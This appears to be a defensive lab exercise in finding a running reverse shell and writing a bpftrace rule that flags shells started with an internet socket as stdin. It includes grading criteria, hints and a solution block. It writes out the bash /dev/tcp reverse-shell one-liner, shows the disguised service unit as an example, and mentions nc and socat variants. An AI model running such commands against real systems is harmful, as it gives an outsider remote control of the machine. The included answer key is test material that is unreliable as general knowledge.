---
title: "a shell is talking to a socket"
---

## The situation

Somebody has a shell on this box. Not a login: a *reverse shell*, the kind an
attacker gets by making a compromised process run

```
bash -i >& /dev/tcp/<their host>/<port> 0>&1
```

The box connects out to them, and the shell reads its commands from that
connection and writes the answers back. No SSH session, no `who` entry, and
outbound connections are rarely firewalled the way inbound ones are.

The team wants two things: the one running now, and an alert that would have
caught it starting. The first idea for the alert is "fire on every exec of
`sh` or `bash`". On this box cron runs `/bin/sh -c` every minute, every SSH
login starts a shell, and every script with a `#!/bin/sh` line is one more.
An alert that fires a few thousand times a day is an alert nobody reads.

What makes a reverse shell different is not that a shell started. It is what
the shell's standard input is: a network socket.

## Your objectives

- Find the running reverse shell, and write `/root/answers/revshell.md`:

```
pid: <the shell's PID>
peer: <the address:port its socket is connected to>
```

- Write `/root/revshell.bt`, a bpftrace program that prints a line when a
  shell starts with a network socket as its stdin, and nothing for anything
  else

## What you're being graded on

- `pid` and `peer` name the running shell and the remote end of its
  connection
- the grader runs your rule, then:
  - runs the cron job's `/bin/sh -c` with stdin from `/dev/null` and from a
    pipe — **nothing** printed
  - logs in over SSH with a terminal and without one — **nothing** printed
  - starts the cron job's shell with a unix socket as stdin — **nothing**
    printed
  - starts `bash -i` on a TCP connection, and `sh -i` exec'd from Python with a
    TCP socket on fd 0 — **a line for each**

<details>
<summary>Hint 1 — what is a process's stdin</summary>

```
ls -l /proc/<pid>/fd/0
```

A terminal is `/dev/pts/N`, a pipe is `pipe:[...]`, a socket is
`socket:[inode]`. `ss -tnp` maps TCP connections to the processes holding them.

</details>

<details>
<summary>Hint 2 — catching a start</summary>

`tracepoint:sched:sched_process_exec` fires once the new program has replaced
the old one. `comm` is already the new program's name, and the file
descriptors it inherited are in place.

</details>

<details>
<summary>Hint 3 — from fd 0 to a socket family</summary>

With BTF, bpftrace can walk kernel structures from `curtask`:
`curtask->files->fdt->fd[0]` is the `struct file *` for fd 0. A socket's inode
has `S_IFSOCK` (`0xc000`) in `i_mode`, and its `private_data` is a
`struct socket *`; the family is in `->sk->__sk_common.skc_family`.

</details>

## Finding the one that is running

Every shell is a candidate. Ask each what its stdin is:

```
$ for p in $(pgrep -x bash; pgrep -x sh); do echo "$p $(readlink /proc/$p/fd/0)"; done
1904 /dev/pts/0
2311 socket:[48812]
$ ss -tnp | grep 'pid=2311,'
ESTAB 0 0 127.0.0.1:51736 127.0.0.1:31422 users:(("bash",pid=2311,fd=0),("bash",pid=2311,fd=1),...)
$ systemctl status 2311 | head -1
● fc-cache-refresh.service - /usr/bin/bash -c bash -i >& /dev/tcp/127.0.0.1/31422 0>&1
```

Your own login shell has a terminal. PID 2311 has a TCP socket on fds 0, 1
and 2, connected to `127.0.0.1:31422`, and runs under a unit named to look
like font-cache housekeeping. In a real incident the peer would be somewhere
off the box; here the "attacker" listens on loopback.

## Writing the rule

Hook process start, not the syscall: `execve` has a `syscalls:sys_enter_execve`
tracepoint, and on kernels that deliver the per-syscall tracepoints to BPF
only for CPU 0 — Ubuntu's 7.0 kernels, for one — it misses most execs. The
scheduler's `sched_process_exec` fires on every CPU, and fires *after* the
exec succeeded, so `comm` is the shell's name rather than its parent's.

Then look at fd 0 the way `/proc/<pid>/fd/0` did, from inside the kernel:

```
tracepoint:sched:sched_process_exec
/ comm == "sh" || comm == "bash" || comm == "dash" || comm == "zsh" /
{
  $f = curtask->files->fdt->fd[0];
  if ($f != 0 && ($f->f_inode->i_mode & 0xf000) == 0xc000) {
    $fam = ((struct socket *)$f->private_data)->sk->__sk_common.skc_family;
    if ($fam == 2 || $fam == 10) {
      time("%H:%M:%S ");
      printf("reverse shell: comm=%s uid=%d\n", comm, uid);
    }
  }
}
```

The two checks that keep it quiet are both needed:

- **Is it a shell?** `sshd-session` and `sshd-auth` start with the client's
  TCP connection as stdin. A rule that only asks "is stdin an internet socket"
  fires on every SSH login.
- **Which socket family?** Plenty of legitimate shells start on a socket that
  never leaves the box: a socket-activated service (`StandardInput=socket` on a
  unix-socket unit), or a supervisor that talks to its child over a
  `socketpair()`. `AF_INET` (2) and `AF_INET6` (10) are the network; `AF_UNIX`
  (1) is not.

Cron's shell gets a pipe or `/dev/null`, a login with a terminal gets a pts, a
login without one gets pipes, and none of those is a socket at all.

The line leaves out the PID on purpose. Inside this container bpftrace cannot
translate a PID into the box's PID namespace (it warns
`get_ns_current_pid_tgid, retcode: -22`), and `pid` comes back as 0 or as a
number `ps` in the box does not know. On a plain host, add `pid` to the line;
here, `ss -tnp` gives the PID.

What this rule does not catch: a shell whose stdin is a pipe from a process
that holds the socket (`nc host port -e` variants, `socat`), or a payload that
is not called `sh`. A production detector — Falco, Tetragon — keeps the same
idea and widens both checks. The point here is the shape: decide what makes
the bad event different from the hundred legitimate ones that look like it,
and test the rule against the legitimate ones as hard as against the bad one.

## Checking yourself

Run your rule in one shell. In another:

```
/bin/sh -c 'true' < /dev/null                 # nothing
python3 -c 'import socket,time; s=socket.socket(); s.bind(("127.0.0.1",9555)); s.listen(); c,_=s.accept(); c.send(b"exit\n"); time.sleep(1)' &
sleep 0.5; bash -c 'bash -i >& /dev/tcp/127.0.0.1/9555 0>&1'   # one line
```

<details>
<summary>Solution</summary>

`/root/revshell.bt` is the program under "Writing the rule".

```
pid: 2311
peer: 127.0.0.1:31422
```

(Your PID and port differ; take them from `/proc/<pid>/fd/0` and `ss -tnp`.)

</details>
